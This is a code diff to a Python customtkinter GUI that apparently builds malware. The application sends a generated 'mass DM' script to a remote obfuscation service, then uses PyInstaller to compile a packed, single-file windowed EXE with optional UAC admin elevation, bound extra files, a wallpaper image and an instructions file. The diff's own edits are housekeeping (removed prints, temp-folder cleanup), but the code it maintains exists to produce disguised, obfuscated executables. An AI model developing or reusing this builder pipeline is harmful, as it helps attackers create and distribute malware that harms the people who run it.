@@ -116,7 +116,6 @@ class Frame(customtkinter.CTkFrame):
 
     def on_click(self, widgets, default, state):
         for count, widget in enumerate(widgets.values()):
-            print(default)
             if count in default:
                 continue
             if isinstance(widget, customtkinter.CTkEntry):
@@ -365,8 +364,6 @@ class App(customtkinter.CTk):
             "ADMIN": admin
         }
 
-        print(massdm_script)
-        
         src = requests.get('https://septicx.repl.co/api/obfuscate', json={
             "options": {
                 "base": self.base,
@@ -394,8 +391,8 @@ class App(customtkinter.CTk):
 
         for path in binder_files:
             filename = path.split("/")[-1]
-            shutil.copyfile(path, f'src\\files\\binder_{filename}')
-            binder_args += ['--add-data', f'{dir}\\src\\files\\binder_{filename};.']
+            shutil.copyfile(path, f'src\\temp\\binder_{filename}')
+            binder_args += ['--add-data', f'{dir}\\src\\temp\\binder_{filename};.']
 
         command = ['python', '-m', 'PyInstaller', '--noconfirm', '--onefile', '--windowed', '--icon' if icon else '', icon if icon else '', '--uac-admin' if admin else '', '--upx-dir', 'build\\upx', '--workpath', 'build', '--specpath', 'build\\spec', '--add-data', f'{dir}\\src\\temp\\instructions.txt;.', '--add-data', f'{dir}\\src\\files\\wallpaper.jpg;.', '--add-data', f'{dir}\\src\\files\\failed.jpg;.'] + binder_args + ['--clean', f'{dir}\\src\\output.py']
         for _ in range(command.count('')):
@@ -405,6 +402,9 @@ class App(customtkinter.CTk):
         subprocess.call(command, shell=True)
         self.response_label.configure(text='EXE in dist folder')
         print(self.color('Your file is in the dist folder named "output.exe"'))
+
+        for file in os.listdir('src\\temp'):
+            os.remove(f'src\\temp\\{file}')
         os.system('PAUSE')
         
     def color(self, text, color='blue'):
